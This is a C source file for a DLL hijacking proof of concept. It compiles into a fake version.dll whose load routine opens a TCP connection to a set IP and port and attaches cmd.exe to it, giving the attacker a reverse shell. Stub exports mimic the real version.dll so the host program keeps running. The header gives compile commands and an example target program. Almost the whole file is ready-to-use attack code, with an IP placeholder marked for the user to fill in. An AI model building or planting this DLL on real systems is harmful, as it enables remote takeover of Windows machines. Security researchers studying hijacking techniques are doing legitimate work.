/*
Name        : version-reverse.c
Description : DLL Hijacking PoC that creates a reverse shell.
Compile 64  : x86_64-w64-mingw32-gcc -shared -o version.dll version-reverse.c -lws2_32 -fPIC
Compile 32  : i686-w64-mingw32-gcc -shared -o version.dll version.c -lws2_32 -fPIC
Examples    : C:\Windows\System32\systeminfo.exe (64-bit)
Author      : Lisandre.com
Date        : 2025-04-17
Prereq      : Run sigcheck from Sysinternals to know if the app is 32-bit or 64-bit
              sigcheck.exe VulnerableApp.exe
*/
#include <winsock2.h>
#include <stdio.h>
#pragma comment(lib,"ws2_32")

// UPDATE THIS!!!
#define IP "127.0.0.1"
#define PORT 4444

WSADATA wsaData;
SOCKET Winsock;
struct sockaddr_in hax; 

STARTUPINFO ini_processo;
PROCESS_INFORMATION processo_info;

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

    hax.sin_family = AF_INET;
    hax.sin_port = htons(PORT);
    hax.sin_addr.s_addr = inet_addr(IP);

    WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);

    memset(&ini_processo, 0, sizeof(ini_processo));
    ini_processo.cb = sizeof(ini_processo);
    ini_processo.dwFlags = STARTF_USESTDHANDLES;
    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;

    CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);

    return TRUE;
}

// Simple stubbed-out necessary functions to prevent entry point errors, return "expected" values
__declspec(dllexport) BOOL WINAPI GetFileVersionInfoA(LPCSTR, DWORD, DWORD, LPVOID) { return TRUE; }
__declspec(dllexport) BOOL WINAPI GetFileVersionInfoByHandle(HANDLE, LPVOID) { return TRUE; }
__declspec(dllexport) BOOL WINAPI GetFileVersionInfoExA(DWORD, LPCSTR, DWORD, DWORD, LPVOID) { return TRUE; }
__declspec(dllexport) BOOL WINAPI GetFileVersionInfoExW(DWORD, LPCWSTR, DWORD, DWORD, LPVOID) { return TRUE; }
__declspec(dllexport) DWORD WINAPI GetFileVersionInfoSizeA(LPCSTR, LPDWORD lpdwHandle) { if (lpdwHandle) *lpdwHandle = 0; return 128; }
__declspec(dllexport) DWORD WINAPI GetFileVersionInfoSizeExA(DWORD, LPCSTR, LPDWORD lpdwHandle) { if (lpdwHandle) *lpdwHandle = 0; return 128; }
__declspec(dllexport) DWORD WINAPI GetFileVersionInfoSizeExW(DWORD, LPCWSTR, LPDWORD lpdwHandle) { if (lpdwHandle) *lpdwHandle = 0; return 128; }
__declspec(dllexport) DWORD WINAPI GetFileVersionInfoSizeW(LPCWSTR, LPDWORD lpdwHandle) { if (lpdwHandle) *lpdwHandle = 0; return 128; }
__declspec(dllexport) BOOL WINAPI GetFileVersionInfoW(LPCWSTR, DWORD, DWORD, LPVOID) { return TRUE; }

__declspec(dllexport) DWORD WINAPI VerLanguageNameA(DWORD, LPSTR, DWORD) { return 0; }
__declspec(dllexport) DWORD WINAPI VerLanguageNameW(DWORD, LPWSTR, DWORD) { return 0; }
__declspec(dllexport) BOOL WINAPI VerQueryValueA(LPCVOID, LPCSTR, LPVOID* lpBuffer, PUINT puLen) {
    if (lpBuffer) *lpBuffer = (LPVOID)"FakeData";
    if (puLen) *puLen = 8;
    return TRUE;
}
__declspec(dllexport) BOOL WINAPI VerQueryValueW(LPCVOID, LPCWSTR, LPVOID* lpBuffer, PUINT puLen) {
    if (lpBuffer) *lpBuffer = (LPVOID)L"FakeData";
    if (puLen) *puLen = 8;
    return TRUE;
}
